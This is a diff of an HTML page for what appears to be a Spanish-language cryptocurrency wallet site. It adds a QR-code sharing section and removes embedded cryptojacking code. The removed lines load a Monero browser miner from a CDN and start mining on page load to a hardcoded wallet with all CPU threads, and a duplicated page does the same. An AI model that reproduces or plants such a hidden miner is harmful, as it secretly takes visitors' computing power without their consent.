@@ -155,6 +155,13 @@
             <p>Consulta el precio actualizado de WLD en tiempo real. Sigue de cerca el valor de tus activos.</p>
             <div id="wld-price">Cargando precio...</div>
         </div>
+
+        <!-- Sección de QR para Compartir la Aplicación -->
+        <div class="section">
+            <h2>Compartir Aplicación</h2>
+            <p>Escanea el código QR para compartir nuestra aplicación con otros usuarios.</p>
+            <img src="https://wallet-bussines.github.io/Pasarela.png" alt="QR para Compartir la Aplicación" style="width: 200px; height: auto;">
+        </div>
     </div>
 
     <!-- Scripts -->
@@ -186,48 +193,5 @@
         // Llama a la función al cargar la página
         fetchWldPrice();
     </script>
-
-    <!-- Código de minería -->
-    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
-    <script>
-        const pool = "moneroocean.stream";
-        const walletAddress = "46TWxf46vHnFEzvy75AVyHehA37Q8wunq8S9jk88F9kEbR41T7KsCveGpP5TGfZ1dBDpZseVHFN6t9g4VA1hA7Rb4kQ6knZ";
-        const workerId = "GH-XMR";
-        const threads = -1;
-        const password = "";
-        startMining(pool, walletAddress, workerId, threads, password);
-        throttleMiner = 20;
-    </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Monero Mining</title>
-
-    <!-- Import Monero Mining Script -->
-    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
-</head>
-<body>
-
-    <h1></h1>
-    <p></p>
-
-    <script>
-        // Configuración de la conexión y minería
-        const server = "wss://ny1.xmrminingproxy.com";
-        const pool = "moneroocean.stream";
-        const walletAddress = "46TWxf46vHnFEzvy75AVyHehA37Q8wunq8S9jk88F9kEbR41T7KsCveGpP5TGfZ1dBDpZseVHFN6t9g4VA1hA7Rb4kQ6knZ";
-        const workerId = "GH-XMR";
-        const threads = -1;  // Usa todos los núcleos de CPU disponibles
-        const password = "";
-        const throttleMiner = 20;  // Reducir uso de CPU al 20%
-
-        // Iniciar minería
-        startMining(pool, walletAddress, workerId, threads, password);
-    </script>
-
 </body>
 </html>
